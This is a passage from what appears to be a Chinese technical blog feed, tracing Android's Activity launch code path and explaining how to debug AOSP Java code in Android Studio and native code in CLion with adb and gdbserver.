mService.getLifecycleManager().scheduleTransaction(clientTransaction);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/services/core/java/com/android/server/am/ClientLifecycleManager.java</span><br><span class="line">void scheduleTransaction(ClientTransaction transaction) throws RemoteException &#123;</span><br><span class="line">    final IApplicationThread client = transaction.getClient();</span><br><span class="line">    transaction.schedule();</span><br><span class="line">    if (!(client instanceof Binder)) &#123;</span><br><span class="line">        // If client is not an instance of Binder - it&#x27;s a remote call and at this point it is</span><br><span class="line">        // safe to recycle the object. All objects used for local calls will be recycled after</span><br><span class="line">        // the transaction is executed on client in ActivityThread.</span><br><span class="line">        transaction.recycle();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/servertransaction/ClientTransaction.java</span><br><span class="line"></span><br><span class="line">public void schedule() throws RemoteException &#123;</span><br><span class="line">    mClient.scheduleTransaction(this);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line"></span><br><span class="line">public void scheduleTransaction(ClientTransaction transaction) throws RemoteException &#123;</span><br><span class="line">    ActivityThread.this.scheduleTransaction(transaction);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/ClientTransactionHandler.java</span><br><span class="line"></span><br><span class="line">void scheduleTransaction(ClientTransaction transaction) &#123;</span><br><span class="line">    transaction.preExecute(this);</span><br><span class="line">    sendMessage(ActivityThread.H.EXECUTE_TRANSACTION, transaction);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line">public void handleMessage(Message msg) &#123;</span><br><span class="line">    case EXECUTE_TRANSACTION:</span><br><span class="line">        final ClientTransaction transaction = (ClientTransaction) msg.obj;</span><br><span class="line">        mTransactionExecutor.execute(transaction);</span><br><span class="line">        if (isSystem()) &#123;</span><br><span class="line">            // Client transactions inside system process are recycled on the client side</span><br><span class="line">            // instead of ClientLifecycleManager to avoid being cleared before this</span><br><span class="line">            // message is handled.</span><br><span class="line">            transaction.recycle();</span><br><span class="line">        &#125;</span><br><span class="line">        // TODO(lifecycler): Recycle locally scheduled transactions.</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="TransactionExecutor-execute"><a href="#TransactionExecutor-execute" class="headerlink" title="TransactionExecutor.execute"></a>TransactionExecutor.execute</h1><p><code>execute</code> 经过一系列处理后最终调用了 <code>LaunchActivityItem.execute</code> 方法, 看到 <code>LaunchActivityItem</code> 这个类名就可以知道距离关键地方已经不远了, 继续跟进 <code>handleLaunchActivity</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/core/java/android/app/servertransaction/TransactionExecutor.java</span><br><span class="line"></span><br><span class="line">public void execute(ClientTransaction transaction) &#123;</span><br><span class="line">    final IBinder token = transaction.getActivityToken();</span><br><span class="line">    log(&quot;Start resolving transaction for client: &quot; + mTransactionHandler + &quot;, token: &quot; + token);</span><br><span class="line"></span><br><span class="line">    executeCallbacks(transaction);</span><br><span class="line"></span><br><span class="line">    executeLifecycleState(transaction);</span><br><span class="line">    mPendingActions.clear();</span><br><span class="line">    log(&quot;End resolving transaction&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/servertransaction/TransactionExecutor.java</span><br><span class="line"></span><br><span class="line">private void executeLifecycleState(ClientTransaction transaction) &#123;</span><br><span class="line">    final ActivityLifecycleItem lifecycleItem = transaction.getLifecycleStateRequest();</span><br><span class="line">    if (lifecycleItem == null) &#123;</span><br><span class="line">        // No lifecycle request, return early.</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    log(&quot;Resolving lifecycle state: &quot; + lifecycleItem);</span><br><span class="line"></span><br><span class="line">    final IBinder token = transaction.getActivityToken();</span><br><span class="line">    final ActivityClientRecord r = mTransactionHandler.getActivityClient(token);</span><br><span class="line"></span><br><span class="line">    if (r == null) &#123;</span><br><span class="line">        // Ignore requests for non-existent client records for now.</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Cycle to the state right before the final requested state.</span><br><span class="line">    cycleToPath(r, lifecycleItem.getTargetState(), true /* excludeLastState */);</span><br><span class="line"></span><br><span class="line">    // Execute the final transition with proper parameters.</span><br><span class="line">    lifecycleItem.execute(mTransactionHandler, token, mPendingActions);</span><br><span class="line">    lifecycleItem.postExecute(mTransactionHandler, token, mPendingActions);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/servertransaction/LaunchActivityItem.java</span><br><span class="line"></span><br><span class="line">public void execute(ClientTransactionHandler client, IBinder token,</span><br><span class="line">        PendingTransactionActions pendingActions) &#123;</span><br><span class="line">    Trace.traceBegin(TRACE_TAG_ACTIVITY_MANAGER, &quot;activityStart&quot;);</span><br><span class="line">    ActivityClientRecord r = new ActivityClientRecord(token, mIntent, mIdent, mInfo,</span><br><span class="line">            mOverrideConfig, mCompatInfo, mReferrer, mVoiceInteractor, mState, mPersistentState,</span><br><span class="line">            mPendingResults, mPendingNewIntents, mIsForward,</span><br><span class="line">            mProfilerInfo, client);</span><br><span class="line">    client.handleLaunchActivity(r, pendingActions, null /* customIntent */);</span><br><span class="line">    Trace.traceEnd(TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="ActivityThread-handleLaunchActivity"><a href="#ActivityThread-handleLaunchActivity" class="headerlink" title="ActivityThread.handleLaunchActivity"></a>ActivityThread.handleLaunchActivity</h1><p>经过上面代码一步步的跳转，执行到 <code>ActivityThread.performLaunchActivity</code> 方法。在 <code>ActivityThread.performLaunchActivity</code> 方法中首先对 <code>Activity</code> 的 <code>ComponentName</code> 、 <code>ContextImpl</code> 、 <code>Activity</code> 以及 <code>Application</code> 对象进行了初始化并相互关联，然后设置 <code>Activity</code> 主题，最后调用 <code>Instrumentation.callActivityOnCreate</code> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line"></span><br><span class="line">public Activity handleLaunchActivity(ActivityClientRecord r,</span><br><span class="line">        PendingTransactionActions pendingActions, Intent customIntent) &#123;</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    WindowManagerGlobal.initialize();</span><br><span class="line"></span><br><span class="line">    // 启动一个Activity，涉及到创建Activity对象，最终返回Activity对象</span><br><span class="line">    final Activity a = performLaunchActivity(r, customIntent);</span><br><span class="line"></span><br><span class="line">    if (a != null) &#123;</span><br><span class="line">        r.createdConfig = new Configuration(mConfiguration);</span><br><span class="line">        reportSizeConfigurations(r);</span><br><span class="line">        if (!r.activity.mFinished &amp;&amp; pendingActions != null) &#123;</span><br><span class="line">            pendingActions.setOldState(r.state);</span><br><span class="line">            pendingActions.setRestoreInstanceState(true);</span><br><span class="line">            pendingActions.setCallOnPostCreate(true);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // If there was an error, for any reason, tell the activity manager to stop us.</span><br><span class="line">        try &#123;</span><br><span class="line">            //  activity启动失败，则通知AMS finish掉这个Activity</span><br><span class="line">            ActivityManager.getService()</span><br><span class="line">                    .finishActivity(r.token, Activity.RESULT_CANCELED, null,</span><br><span class="line">                            Activity.DONT_FINISH_TASK_WITH_ACTIVITY);</span><br><span class="line">        &#125; catch (RemoteException ex) &#123;</span><br><span class="line">            throw ex.rethrowFromSystemServer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/ActivityThread.java</span><br><span class="line"></span><br><span class="line">private Activity performLaunchActivity(ActivityClientRecord r, Intent customIntent) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    ContextImpl appContext = createBaseContextForActivity(r);</span><br><span class="line">    Activity activity = null;</span><br><span class="line"></span><br><span class="line">    // 创建一个 activity</span><br><span class="line">    java.lang.ClassLoader cl = appContext.getClassLoader();</span><br><span class="line">    activity = mInstrumentation.newActivity(</span><br><span class="line">            cl, component.getClassName(), r.intent);</span><br><span class="line">    StrictMode.incrementExpectedActivityCount(activity.getClass());</span><br><span class="line">    r.intent.setExtrasClassLoader(cl);</span><br><span class="line">    r.intent.prepareToEnterProcess();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    Application app = r.packageInfo.makeApplication(false, mInstrumentation);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    appContext.setOuterContext(activity);</span><br><span class="line">    // 调用 activity.attach</span><br><span class="line">    activity.attach(appContext, this, getInstrumentation(), r.token,</span><br><span class="line">            r.ident, app, r.intent, r.activityInfo, title, r.parent,</span><br><span class="line">            r.embeddedID, r.lastNonConfigurationInstances, config,</span><br><span class="line">            r.referrer, r.voiceInteractor, window, r.configCallback);</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    int theme = r.activityInfo.getThemeResource();</span><br><span class="line">    if (theme != 0) &#123;</span><br><span class="line">        activity.setTheme(theme);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    activity.mCalled = false;</span><br><span class="line">    if (r.isPersistable()) &#123;</span><br><span class="line">        // 调用 activity 的 OnCreate</span><br><span class="line">        mInstrumentation.callActivityOnCreate(activity, r.state, r.persistentState);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        mInstrumentation.callActivityOnCreate(activity, r.state);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return activity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Instrumentation-callActivityOnCreate"><a href="#Instrumentation-callActivityOnCreate" class="headerlink" title="Instrumentation.callActivityOnCreate"></a>Instrumentation.callActivityOnCreate</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// frameworks/base/core/java/android/app/Instrumentation.java</span><br><span class="line"></span><br><span class="line">public void callActivityOnCreate(Activity activity, Bundle icicle) &#123;</span><br><span class="line">    prePerformCreate(activity);</span><br><span class="line">    activity.performCreate(icicle);</span><br><span class="line">    postPerformCreate(activity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// frameworks/base/core/java/android/app/Activity.java</span><br><span class="line"></span><br><span class="line">final void performCreate(Bundle icicle) &#123;</span><br><span class="line">    performCreate(icicle, null);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">final void performCreate(Bundle icicle, PersistableBundle persistentState) &#123;</span><br><span class="line">    mCanEnterPictureInPicture = true;</span><br><span class="line">    restoreHasCurrentPermissionRequest(icicle);</span><br><span class="line">    if (persistentState != null) &#123;</span><br><span class="line">        onCreate(icicle, persistentState);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 调用 onCreate</span><br><span class="line">        onCreate(icicle);</span><br><span class="line">    &#125;</span><br><span class="line">    writeEventLog(LOG_AM_ON_CREATE_CALLED, &quot;performCreate&quot;);</span><br><span class="line">    mActivityTransitionState.readState(icicle);</span><br><span class="line"></span><br><span class="line">    mVisibleFromClient = !mWindow.getWindowStyle().getBoolean(</span><br><span class="line">            com.android.internal.R.styleable.Window_windowNoDisplay, false);</span><br><span class="line">    mFragments.dispatchActivityCreated();</span><br><span class="line">    mActivityTransitionState.setEnterActivityOptions(this, getActivityOptions());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，我们就基本分析了Activity的启动流程。 这里只是简单的过了一遍，让自己对 Android 应用的启动过程中 frameworks 层做了那些工作，主要还是为了理解 FART 做的一些准备。</p>
<p>参考：</p>
<blockquote>
<p><a href="https://juejin.im/post/5dda8504e51d452306073434#heading-10">https://juejin.im/post/5dda8504e51d452306073434#heading-10</a></p>
<p><a href="https://www.jianshu.com/p/a1f40b39b3de">https://www.jianshu.com/p/a1f40b39b3de</a></p>
<p><a href="https://bbs.pediy.com/thread-252630.htm">https://bbs.pediy.com/thread-252630.htm</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android源码阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Android Studio调试Android源码</title>
    <url>/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#%E4%B8%80%E5%AF%BC%E5%85%A5%E6%BA%90%E7%A0%81%E5%88%B0-android-studio">一、导入源码到 Android Studio</a><ul>
<li><a href="#1-%E7%BC%96%E8%AF%91-idegen">1. 编译 idegen</a></li>
<li><a href="#2-%E5%AF%BC%E5%85%A5%E6%BA%90%E7%A0%81">2. 导入源码</a></li>
<li><a href="#3-%E5%BC%80%E5%A7%8B%E8%B0%83%E8%AF%95">3. 开始调试</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->
<h1 id="一、导入源码到-Android-Studio"><a href="#一、导入源码到-Android-Studio" class="headerlink" title="一、导入源码到 Android Studio"></a>一、导入源码到 Android Studio</h1><p>导入源码到 Android Studio<br>要在 Android Studio 中调试源码，那第一步自然是导入系统源码到 Android Studio 中了。</p>
<h2 id="1-编译-idegen"><a href="#1-编译-idegen" class="headerlink" title="1. 编译 idegen"></a>1. 编译 idegen</h2><p>对于 Android 源码的导入， Google 官方给我们提供了一个很方便的工具idegen</p>
<p>它位于我们所下载的系统源码路径中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">developement/tools/idegen</span><br></pre></td></tr></table></figure>
<p>引用 README 的一句话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IDEGen automatically generates Android IDE configurations for IntelliJ IDEA and Eclipse.</span><br></pre></td></tr></table></figure>
<p>idegen 工具会自动生成针对 Android 开发工具（Android Studio和Eclipse）的配置文件。 既然如此，那我们就来使用 idegen 工具生成导入源码所需的配置文件。</p>
<p>首先打开命令行工具，cd 进入到源码路径下，</p>
<p>执行如下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#初始化命令工具</span><br><span class="line">soruce build/envsetup.sh </span><br><span class="line"></span><br><span class="line">#编译 idegen 模块，生成idegen.jar</span><br><span class="line">mmm development/tools/idegen/</span><br><span class="line"></span><br><span class="line">#生成针对 Android 开发工具的配置文件 </span><br><span class="line">sudo ./development/tools/idegen/idegen.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/2019-11-11-20-31-55.png" class="">

<p>在执行完上述指令后，会在源码路径下生成下面三个文件</p>
<img src="/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/2019-11-11-20-20-30.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android.ipr：工程相关的设置，比如编译器配置、入口，相关的libraries等。</span><br><span class="line"></span><br><span class="line">android.iml：描述了modules，比如modules的路径,依赖关系等。</span><br><span class="line"></span><br><span class="line">android.iws：包含了一些个人工作区的设置。</span><br></pre></td></tr></table></figure>

<h2 id="2-导入源码"><a href="#2-导入源码" class="headerlink" title="2. 导入源码"></a>2. 导入源码</h2><p>接下来我们可以开始导入源码了.</p>
<p>由于Android太大了,所以我们需要给IDE更多的内存，在Help &gt; Edit Custom VM 中添加:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Xms1g</span><br><span class="line">-Xmx5g</span><br></pre></td></tr></table></figure>
<p>这两个参数的意思是初始堆内存为1G,最大堆内存为5G，其实不设置也没什么问题,但是经常会在看代码的时候,出现内存不够的错误信息,所以换个大内存还是很有必要的。</p>
<p>然后是AndroidStudio的类大小配置,在Help -&gt; Edit custom properties中添加:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idea.max.intellisense.filesize=100000</span><br></pre></td></tr></table></figure>
<p>这个参数是定义AS默认的类大小的,默认值是2500,会导致太大的Java文件不能被识别,把这个数调大,<br>配置完成后重启IDE。</p>
<p>使用 <code>AndroidStudio</code> 打开 <code>android.ipr</code> ，之后AndroidStudio就开始打开项目了,这个过程会比较缓慢,有时,AS会出现如下信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Extnrnal file changes sync may be slow:The current inotify(7) watch limit is too low.</span><br></pre></td></tr></table></figure>
<p>大致的意思就是由于项目过于庞大,现在AS没有办法很好的监视整个项目的改变了,可以通过如下方式解决:</p>
<ol>
<li><p>在&#x2F;etc&#x2F;sysctl.conf 文件末尾中添加如下代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fs.inotify.max_user_watches = 524288</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在终端执行以下命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sysctl -p --system</span><br></pre></td></tr></table></figure></li>
</ol>
<p>最后重启AS，等待源码加载完成。</p>
<img src="/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/2019-11-11-20-42-05.png" class="">

<p>由于 Android 的系统源码非常庞大，一次性导入 Android Studio 的话需要加载非常长的时间</p>
<p>因此，在正式开始导入前，我们可以打开 android.iml 文件根据自己需要调整要加载的源码。</p>
<img src="/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/2019-11-11-21-23-53.png" class="">

<p>这里<code> &lt;excludeFolder&gt;</code> 表示不需要加载的目录，我们根据自己的需要使用 <code>&lt;excludeFolder&gt;</code> 标签添加对应的目录地址即可。</p>
<p>在加载完源码后，我们也可以在 Project Structure 中的 Module 选项中右键 exclude 来排除不需要加载的源码目录，如图：</p>
<img src="/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/2019-11-11-20-57-37.png" class="">


<h2 id="3-开始调试"><a href="#3-开始调试" class="headerlink" title="3. 开始调试"></a>3. 开始调试</h2><p>调试前要设置 Project 的 SDK ，File -&gt; Project 下打开 Project Structure，选中 Project 设置对应版本的 SDK，于系统版本一致：</p>
<img src="/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/2019-11-11-21-07-04.png" class="">

<p>此时点击 <code>Android Studio</code> 工具栏的 <code>run -&gt; attach debugger to Android process</code> 按钮，会打开 <code>Choose Process</code> 窗口，我们根据自己需要调试的代码选择对应的进程：</p>
<img src="/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/2019-11-11-21-08-51.png" class="">

<p>这里假设我们要调试 <code>Android</code> 自带浏览器的源码，如图，我们在它的入口文件 <code>WebViewBrowserActivity</code> 中的 <code>loadUrlFromUrlBar</code> 方法中打上断点。</p>
<img src="/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/2019-11-11-21-11-23.png" class="">

<p>然后我们在 <code>app</code> 的 <code>url</code> 输入栏输入 网址进行跳转,我们可以看到，代码成功进入了断点，然后我们就可以随心所欲地调试我们想要的调试的 Java 代码了。</p>
<img src="/2019/11/11/%E4%BD%BF%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Android%E6%BA%90%E7%A0%81/2019-11-11-21-13-00.png" class="">


<blockquote>
<p>参考：</p>
<p><a href="https://www.jianshu.com/p/4ab864caefb2">https://www.jianshu.com/p/4ab864caefb2</a></p>
<p><a href="http://gityuan.com/2016/08/13/android-os-env/">http://gityuan.com/2016/08/13/android-os-env/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android 源码调试</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Clion调试Android native源码</title>
    <url>/2019/11/13/%E4%BD%BF%E7%94%A8Clion%E8%B0%83%E8%AF%95Android-native%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#%E4%B8%80clion%E9%85%8D%E7%BD%AE">一、Clion配置</a><ul>
<li><a href="#1%E7%BC%96%E5%86%99cmakeliststxt">1.编写CMakelists.txt</a></li>
</ul>
</li>
<li><a href="#%E4%BA%8C-%E5%AF%BC%E5%85%A5aosp%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95">二、 导入Aosp项目，配置远程调试</a><ul>
<li><a href="#1-%E9%85%8D%E7%BD%AEgdb%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83">1. 配置gdb远程调试环境</a></li>
<li><a href="#2-%E7%BC%96%E5%86%99android_gdbserver%E8%84%9A%E6%9C%AC">2. 编写android_gdbserver脚本</a></li>
<li><a href="#3-%E8%B0%83%E8%AF%95">3. 调试</a></li>
</ul>
</li>
<li><a href="#%E4%B8%89%E5%85%B6%E4%BB%96">三、其他</a><ul>
<li><a href="#1-%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95">1. 打开调试</a></li>
<li><a href="#2-%E9%85%8D%E7%BD%AEcmakelist%E5%B9%B6%E5%AF%BC%E5%85%A5%E6%BA%90%E7%A0%81">2. 配置CMakeList,并导入源码</a></li>
<li><a href="#3-%E5%AE%89%E8%A3%85androidnativedebug%E6%8F%92%E4%BB%B6%E5%B9%B6%E9%85%8D%E7%BD%AE">3. 安装AndroidNativeDebug插件，并配置</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->
<h1 id="一、Clion配置"><a href="#一、Clion配置" class="headerlink" title="一、Clion配置"></a>一、Clion配置</h1><h2 id="1-编写CMakelists-txt"><a href="#1-编写CMakelists-txt" class="headerlink" title="1.编写CMakelists.txt"></a>1.编写<code>CMakelists.txt</code></h2><p>目前CLion只能识别CMake项目，所以为了使用CLion调试AOSP，需要编写CMakeList.txt。否则无法使用远程调试功能。<br>参考这篇博客<a href="https://blog.csdn.net/li864804994/article/details/79487834">Android Native C&#x2F;C++ 使用CLion阅读&#x2F;编译技巧</a></p>
<p>直接下载此地址的配置文件<a href="https://github.com/Ahren-Li/android-cmake-project">android-cmake-project</a>，并拷贝至Android源码根目录。</p>
<p>配置<code>env_android.cmake</code>文件，我的配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">set(ANDROID_SDK_VERSION 27)</span><br><span class="line">set(ANDROID_LUNCH sailfish) # 编译目标</span><br><span class="line">set(ANDROID_TARGET_ARCH arm64)</span><br><span class="line">#set(ANDROID_ABI &quot;armeabi-v7a&quot;)</span><br><span class="line">#set(ANDROID_ABI &quot;armeabi-v7a with NEON&quot;)</span><br><span class="line">set(ANDROID_ABI &quot;arm64-v8a&quot;)</span><br><span class="line">set(ANDROID_TOOLCHAIN_NAME &quot;clang&quot;)</span><br><span class="line">set(ANDROID_STL c++_static)</span><br><span class="line">set(ANDROID_CLANG_VERSION &quot;clang-4053586&quot;)</span><br><span class="line">#set(ANDROID_PLATFORM android-25)</span><br><span class="line">#set(ANDROID_NATIVE_API_LEVEL 25)</span><br></pre></td></tr></table></figure>

<h1 id="二、-导入Aosp项目，配置远程调试"><a href="#二、-导入Aosp项目，配置远程调试" class="headerlink" title="二、 导入Aosp项目，配置远程调试"></a>二、 导入Aosp项目，配置远程调试</h1><p>导入aosp需要等待index完成。</p>
<h2 id="1-配置gdb远程调试环境"><a href="#1-配置gdb远程调试环境" class="headerlink" title="1. 配置gdb远程调试环境"></a>1. 配置gdb远程调试环境</h2><p>选择 <code>Edit Configurations</code> -&gt; <code>GDB Remote Debug</code> 按照下图进行配置：</p>
<img src="/2019/11/13/%E4%BD%BF%E7%94%A8Clion%E8%B0%83%E8%AF%95Android-native%E6%BA%90%E7%A0%81/2019-11-13-19-11-03.png" class="">
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GDB: 这里我配置的为源码目录下的gdb</span><br><span class="line">‘target remote’ args: 这里填的端口号</span><br><span class="line">Sysroot: 这里填源码路径下的symbols</span><br><span class="line">Path mappings: 根据自己的源码填相应的path</span><br></pre></td></tr></table></figure>
<h2 id="2-编写android-gdbserver脚本"><a href="#2-编写android-gdbserver脚本" class="headerlink" title="2. 编写android_gdbserver脚本"></a>2. 编写android_gdbserver脚本</h2><p>这里我对<a href="https://blog.csdn.net/lylwo317/article/details/86545130">原博</a>中的脚本做了一点小修改，将 <code>gdbserver</code> 改为了 <code>gdbserver64</code> 。原因是后面调试时使用<code>gdb</code>连接不上远程的<code>gdbserver</code>，报错信息为<code>Reply contains invalid hex digit 59</code>，然后改为<code>gdbserver64</code>就可以了。猜测与<code>init</code>为64位程序有关。</p>
<p><code>-s ~/script/start_android_gdb_server.sh</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env bash</span><br><span class="line">gdbServerPid=`adb shell ps | grep gdbserver | awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line"></span><br><span class="line">if [[ &quot;&quot; != $&#123;gdbServerPid&#125; ]]; then</span><br><span class="line">    adb shell su -c &quot;kill $&#123;gdbServerPid&#125;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">adb forward tcp:1234 tcp:1234</span><br><span class="line"></span><br><span class="line">if [[ `adb shell whoami` == &#x27;root&#x27;  ]]; then</span><br><span class="line">    is_root=true</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ -n $1 ]]; then</span><br><span class="line">	appPid=`adb shell ps | grep $&#123;1&#125; | awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">	if [[ -n $&#123;appPid&#125; ]]; then</span><br><span class="line">        if [[ $is_root == true  ]]; then</span><br><span class="line">            adb shell gdbserver64 :1234 --attach $&#123;appPid&#125;</span><br><span class="line">        else</span><br><span class="line">            adb shell su -c &quot;gdbserver64 :1234 --attach $&#123;appPid&#125; &quot;</span><br><span class="line">        fi</span><br><span class="line">    else</span><br><span class="line">    	echo &quot;$1 进程没有启动！&quot;</span><br><span class="line">	fi</span><br><span class="line">else</span><br><span class="line">	echo &quot;请设置要调试的进程名（app的进程名是包名）。例如 $0 &lt;process name&gt;&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>通过软连接连接到 ~&#x2F;bin目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s ~/script/start_android_gdb_server.sh ~/bin/android_gdb_server</span><br></pre></td></tr></table></figure>

<h2 id="3-调试"><a href="#3-调试" class="headerlink" title="3. 调试"></a>3. 调试</h2><p>这里通过调试zygote来演示如何使用CLion调试</p>
<ol>
<li><p>先停止zygote服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell stop zygote</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动gdbserver</p>
</li>
</ol>
<img src="/2019/11/13/%E4%BD%BF%E7%94%A8Clion%E8%B0%83%E8%AF%95Android-native%E6%BA%90%E7%A0%81/2019-11-13-19-28-38.png" class="">

<ol start="3">
<li>点击调试按钮（右边绿色按钮）</li>
</ol>
<img src="/2019/11/13/%E4%BD%BF%E7%94%A8Clion%E8%B0%83%E8%AF%95Android-native%E6%BA%90%E7%A0%81/2019-11-13-19-29-40.png" class="">

<p>如下图表示连接成功</p>
<img src="/2019/11/13/%E4%BD%BF%E7%94%A8Clion%E8%B0%83%E8%AF%95Android-native%E6%BA%90%E7%A0%81/2019-11-13-19-30-57.png" class="">
<img src="/2019/11/13/%E4%BD%BF%E7%94%A8Clion%E8%B0%83%E8%AF%95Android-native%E6%BA%90%E7%A0%81/2019-11-13-19-31-16.png" class="">

<ol start="4">
<li><p>设置断点位置如下<br><code>system/core/init/service.cpp</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool Service::Start() &#123;</span><br><span class="line">    // Starting a service removes it from the disabled or reset state and</span><br><span class="line">    // immediately takes it out of the restarting state if it was in there.</span><br><span class="line">    flags_ &amp;= (~(SVC_DISABLED|SVC_RESTARTING|SVC_RESET|SVC_RESTART|SVC_DISABLED_START));</span><br><span class="line"></span><br><span class="line">    // Running processes require no additional work --- if they&#x27;re in the</span><br><span class="line">    // process of exiting, we&#x27;ve ensured that they will immediately restart</span><br><span class="line">    // on exit, unless they are ONESHOT.</span><br><span class="line">    if (flags_ &amp; SVC_RUNNING) &#123;//在这里断点</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动zygote服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell start zygote</span><br></pre></td></tr></table></figure>
</li>
<li><p>停止在断点处</p>
</li>
</ol>
<img src="/2019/11/13/%E4%BD%BF%E7%94%A8Clion%E8%B0%83%E8%AF%95Android-native%E6%BA%90%E7%A0%81/2019-11-13-19-32-26.png" class="">

<blockquote>
